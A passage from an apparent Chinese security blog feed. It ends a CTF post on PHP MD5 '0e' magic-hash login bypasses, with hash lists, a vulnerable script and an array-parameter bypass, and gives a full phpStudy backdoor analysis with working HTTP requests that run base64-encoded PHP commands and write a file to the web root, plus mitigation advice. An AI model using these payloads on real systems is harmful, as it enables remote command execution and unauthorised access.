class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><h3 id="大写字母类"><a href="#大写字母类" class="headerlink" title="大写字母类"></a>大写字母类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">QLTHNDT</span><br><span class="line">0e405967825401955372549139051580</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">EEIZDOI</span><br><span class="line">0e782601363539291779881938479162</span><br><span class="line">TUFEPMC</span><br><span class="line">0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ</span><br><span class="line">0e382098788231234954670291303879</span><br><span class="line">UYXFLOI</span><br><span class="line">0e552539585246568817348686838809</span><br><span class="line">IHKFRNS</span><br><span class="line">0e256160682445802696926137988570</span><br><span class="line">PJNPDWY</span><br><span class="line">0e291529052894702774557631701704</span><br><span class="line">ABJIHVY</span><br><span class="line">0e755264355178451322893275696586</span><br><span class="line">DQWRASX</span><br><span class="line">0e742373665639232907775599582643</span><br><span class="line">DYAXWCA</span><br><span class="line">0e424759758842488633464374063001</span><br><span class="line">GEGHBXL</span><br><span class="line">0e248776895502908863709684713578</span><br><span class="line">GGHMVOE</span><br><span class="line">0e362766013028313274586933780773</span><br><span class="line">GZECLQZ</span><br><span class="line">0e537612333747236407713628225676</span><br><span class="line">NWWKITQ</span><br><span class="line">0e763082070976038347657360817689</span><br><span class="line">NOOPCJF</span><br><span class="line">0e818888003657176127862245791911</span><br><span class="line">MAUXXQC</span><br><span class="line">0e478478466848439040434801845361</span><br><span class="line">MMHUWUV</span><br><span class="line">0e701732711630150438129209816536</span><br></pre></td></tr></table></figure><p>MD5值(哈希值)相等的问题可以用哈希值碰撞，也可以用数组绕过，如：<code>username[]=1&amp;password[]=2</code><br>题目源代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html; charset=utf-8&quot;</span>); </span><br><span class="line">session_start(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;CHVGCGMM_login&#x27;</span>])) &#123; </span><br><span class="line">    header(<span class="string">&#x27;Location: panel.php&#x27;</span>); </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;登录成功！&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$p_username = $_POST[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line">$p_password = $_POST[<span class="string">&#x27;password&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($p_username) &amp;&amp; <span class="keyword">isset</span>($p_password)) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($p_username == $p_password) <span class="keyword">die</span>(<span class="string">&#x27;用户名与密码不能相同！&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (md5($p_password) === md5($p_username)) &#123; </span><br><span class="line">        $_SESSION[<span class="string">&#x27;CHVGCGMM_login&#x27;</span>] = $p_username; </span><br><span class="line">        header(<span class="string">&#x27;Location: panel.php&#x27;</span>); </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;登录成功！&#x27;</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;密码不正确！&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上题使用数组即可绕过</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.freebuf.com/news/67007.html">https://www.freebuf.com/news/67007.html</a></li><li><a href="https://www.cnblogs.com/Jie-Fei/p/9886598.html">https://www.cnblogs.com/Jie-Fei/p/9886598.html</a></li><li><a href="https://www.cnblogs.com/0yst3r-2046/p/10748412.html">https://www.cnblogs.com/0yst3r-2046/p/10748412.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞叙述&quot;&gt;&lt;a href=&quot;#漏洞叙述&quot; class=&quot;headerlink&quot; title=&quot;漏洞叙述&quot;&gt;&lt;/a&gt;漏洞叙述&lt;/h1&gt;&lt;p&gt;  PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如</summary>
      
    
    
    
    <category term="胡乱倒腾" scheme="http://www.ywboy.cn/categories/%E8%83%A1%E4%B9%B1%E5%80%92%E8%85%BE/"/>
    
    
    <category term="CTF" scheme="http://www.ywboy.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门分析</title>
    <link href="http://www.ywboy.cn/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <id>http://www.ywboy.cn/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</id>
    <published>2020-09-26T05:52:36.000Z</published>
    <updated>2020-10-03T08:03:18.767Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><blockquote><p>有问题的版本：</p><p>​    默认路劲    C:\phpStudy\PHPTutorial\php\php-5.2.17\ext\</p></blockquote><table><thead><tr><th>PHPStudy</th><th>php版本</th><th>ext扩展文件夹下</th></tr></thead><tbody><tr><td>phpStudy20180211</td><td>php5.4.45 和 php5.2.17</td><td>php_xmlrpc.dll</td></tr><tr><td>phpStudy20161103</td><td>php5.4.45 和 php5.2.17</td><td>php_xmlrpc.dll</td></tr></tbody></table><p>后门所在位置：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104165448398.png" alt="image-20191104165448398"></p><p>使用记事本打开 <code>php_xmlrpc.dll</code>文件</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>我们通过burp抓包软件来利用后门</p><p>没有修改的请求头信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104170224539.png" alt="image-20191104170224539"></p><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip,deflate #deflate前面的空格去掉</span><br><span class="line">Accept-charset:c3lzdGVtKCdpcGNvbmZpZycpOw&#x3D;&#x3D; # 添加新字段，值需要base64编码</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行系统命令：<code>c3lzdGVtKCdpcGNvbmZpZycpOw==</code></p><p>解码为：<code>system(&#39;ipconfig&#39;);</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104170721857.png" alt="image-20191104170721857"></p><p>phpinfo</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104170830577.png" alt="image-20191104170830577"></p><p>写一句话木马,利用 file_put_contents()函数</p><p><code>file_put_contents(&quot;C:\phpStudy\PHPTutorial\WWW\info.php&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104171240547.png" alt="image-20191104171240547"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-charset:ZmlsZV9wdXRfY29udGVudHMoIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1xpbmZvLnBocCIsIjw&#x2F;cGhwIHBocGluZm8oKTsgPz4iKTs&#x3D;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104171403855.png" alt="image-20191104171403855"></p><h2 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h2><p>1.修改<code>php.ini</code>配置文件，注释这个扩展文件</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104171619733.png" alt="image-20191104171619733"></p><ol start="2"><li>使用最新的phpstudy</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题概述&quot;&gt;&lt;a href=&quot;#问题概述&quot; class=&quot;headerlink&quot; title=&quot;问题概述&quot;&gt;&lt;/a&gt;问题概述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;有问题的版本：&lt;/p&gt;
&lt;p&gt;​    默认路劲    C:\phpStudy\PHPTutori</summary>
      
    
    
    
    <category term="PHP" scheme="http://www.ywboy.cn/categories/PHP/"/>
    
    
    <category term="php安全" scheme="http://www.ywboy.cn/tags/php%E5%AE%89%E5%85%A8/"/>
    
    <category term="phpstudy后门分析" scheme="http://www.ywboy.cn/tags/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
